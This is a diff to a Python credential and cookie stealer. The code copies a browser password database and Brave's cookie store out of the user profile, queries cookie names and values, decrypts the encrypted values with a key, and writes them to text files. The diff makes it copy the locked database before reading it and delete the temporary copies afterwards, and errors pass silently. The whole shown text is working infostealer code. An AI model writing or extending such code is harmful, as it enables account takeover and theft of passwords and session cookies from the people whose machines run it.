@@ -13,7 +13,6 @@ import sys
 def delete_file(file):
     try:
         os.remove(file)
-        #os.remove("passwords.txt")
     except:
         pass
 
@@ -102,7 +101,7 @@ def save_passwords(db_dir, key_dir):
         db_path = os.path.join(os.environ["USERPROFILE"], db_dir)
     except:
         sys.exit(0)
-    file = "data.db"
+    file = "passwords.db"
     try:
         shutil.copyfile(db_path, file)
     except:
@@ -143,8 +142,9 @@ save_passwords(load_path("db"), load_path("dir"))
 def fetch_cookies(dir):
     try:
         file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
-
-        conn = sqlite3.connect(file)
+        shutil.copyfile(file, "cookies.db")
+        
+        conn = sqlite3.connect("cookies.db")
         query = 'SELECT name, value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc FROM cookies'
         cursor = conn.execute(query)
     except:
@@ -156,20 +156,22 @@ def fetch_cookies(dir):
             cookie = f"\nName: {name}\nValue: {value}\nDomain: {host_key}\nPath: {path}\nExpires: {expires_utc}\nCreation: {creation_utc}\nSecure: {is_secure}\nHttponly: {is_httponly}\n"
             store_data("cookies.txt", cookie)
         conn.close()
+        delete_file("cookies.db")
     except:
         pass
 
 fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")
 
 ##
-##Extract Brave cookies and decrypt them
+##Extract encrypted cookies and decrypt them
 ##
 
 def d_fetch_cookies(dir):
     try:
         file = os.path.join(os.environ["USERPROFILE"], dir) #r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
-
-        conn = sqlite3.connect(file)
+        shutil.copy(file, "cookies.db")
+        
+        conn = sqlite3.connect("cookies.db")
         query = 'SELECT name, encrypted_value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc FROM cookies'
         cursor = conn.execute(query)
     except:
@@ -182,6 +184,7 @@ def d_fetch_cookies(dir):
             cookie = f"\nName: {name}\nValue: {decrypt_string(value, key)}\nDomain: {host_key}\nPath: {path}\nExpires: {expires_utc}\nCreation: {creation_utc}\nSecure: {is_secure}\nHttponly: {is_httponly}\n"
             store_data("Brave-cookies.txt", cookie)
         conn.close()
+        delete_file("cookies.db")
     except:
         pass
 
